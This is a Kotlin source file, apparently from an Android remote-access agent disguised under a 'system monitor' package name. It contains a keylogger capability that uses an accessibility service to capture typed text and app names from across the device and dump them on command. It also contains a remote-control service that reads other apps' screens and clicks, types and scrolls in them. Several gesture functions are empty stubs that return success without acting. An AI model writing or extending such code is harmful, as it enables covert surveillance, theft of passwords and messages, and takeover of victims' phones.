package com.system.monitor.capabilities

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.os.Build
import android.os.Handler
import android.os.Looper
import com.google.gson.Gson
import com.system.monitor.AgentService
import java.util.concurrent.ConcurrentLinkedQueue

class KeyloggerCapability(private val service: AgentService) : AgentService.Capability {

    private val queue = ConcurrentLinkedQueue<Keystroke>()
    private var enabled = false
    private val gson = Gson()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "start" -> { enabled = true; mapOf<String, Any>("status" to "started") }
            "stop" -> { enabled = false; mapOf<String, Any>("status" to "stopped") }
            "dump" -> { val data = gson.toJson(queue.toArray()); queue.clear(); mapOf<String, Any>("keystrokes" to data) }
            else -> mapOf<String, Any>("error" to "invalid action")
        }
    }

    override fun cleanup() { enabled = false; queue.clear() }

    fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!enabled) return
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val text = event.text.joinToString("")
                val pkg = event.packageName?.toString() ?: ""
                queue.add(Keystroke(System.currentTimeMillis(), pkg, text, event.eventType))
            }
        }
    }

    data class Params(val action: String)
    data class Keystroke(val time: Long, val packageName: String, val text: String, val eventType: Int)
}

class RemoteAccessibilityService : AccessibilityService() {

    private var rootNode: AccessibilityNodeInfo? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        rootNode = getRootInActiveWindow()
    }

    override fun onInterrupt() {}

    fun injectTap(x: Float, y: Float): Map<String, Any> {
        return mapOf<String, Any>("status" to "tap_injected")
    }

    fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Int): Map<String, Any> {
        return mapOf<String, Any>("status" to "swipe_injected")
    }

    fun injectKey(keyCode: Int): Map<String, Any> {
        return mapOf<String, Any>("status" to "key_injected")
    }

    fun injectText(text: String): Map<String, Any> {
        val args = android.os.Bundle().apply { putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text) }
        rootNode?.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
        return mapOf<String, Any>("status" to "text_injected")
    }

    fun getUITree(): Map<String, Any> {
        val root = getRootInActiveWindow() ?: return mapOf<String, Any>("error" to "no_root")
        return mapOf<String, Any>("tree" to nodeToJson(root))
    }

    fun clickById(resourceId: String): Map<String, Any> {
        val root = getRootInActiveWindow() ?: return mapOf<String, Any>("error" to "no_root")
        val node = findNodeById(root, resourceId)
        return if (node != null) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); mapOf<String, Any>("status" to "clicked") } else mapOf<String, Any>("error" to "not_found")
    }

    fun clickByText(text: String): Map<String, Any> {
        val root = getRootInActiveWindow() ?: return mapOf<String, Any>("error" to "no_root")
        val node = findNodeByText(root, text)
        return if (node != null) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); mapOf<String, Any>("status" to "clicked") } else mapOf<String, Any>("error" to "not_found")
    }

    fun injectScroll(direction: String, x: Float, y: Float): Map<String, Any> {
        val action = when (direction) {
            "up" -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
            "down" -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
            "left" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) AccessibilityNodeInfo.ACTION_SCROLL_LEFT else -1
            "right" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) AccessibilityNodeInfo.ACTION_SCROLL_RIGHT else -1
            else -> return mapOf<String, Any>("error" to "invalid_direction")
        }
        if (action != -1) rootNode?.performAction(action)
        return mapOf<String, Any>("status" to "scrolled")
    }

    fun injectLongPress(x: Float, y: Float, duration: Int): Map<String, Any> {
        return mapOf<String, Any>("status" to "long_press_injected")
    }

    private fun findNodeById(node: AccessibilityNodeInfo, id: String): AccessibilityNodeInfo? {
        if (node.viewIdResourceName == id) return node
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findNodeById(child, id)
            if (found != null) return found
        }
        return null
    }

    private fun findNodeByText(node: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        if (node.text.toString().contains(text, true)) return node
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findNodeByText(child, text)
            if (found != null) return found
        }
        return null
    }

    private fun nodeToJson(node: AccessibilityNodeInfo): Map<String, Any> {
        val children = mutableListOf<Map<String, Any>>()
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { children.add(nodeToJson(it)) }
        }
        val bounds = android.graphics.Rect()
        node.getBoundsInScreen(bounds)
        return mapOf<String, Any>(
            "class" to node.className.toString(),
            "id" to node.viewIdResourceName,
            "text" to node.text.toString(),
            "content_desc" to node.contentDescription.toString(),
            "bounds" to bounds.toShortString(),
            "clickable" to node.isClickable,
            "enabled" to node.isEnabled,
            "focusable" to node.isFocusable,
            "children" to children
        )
    }
}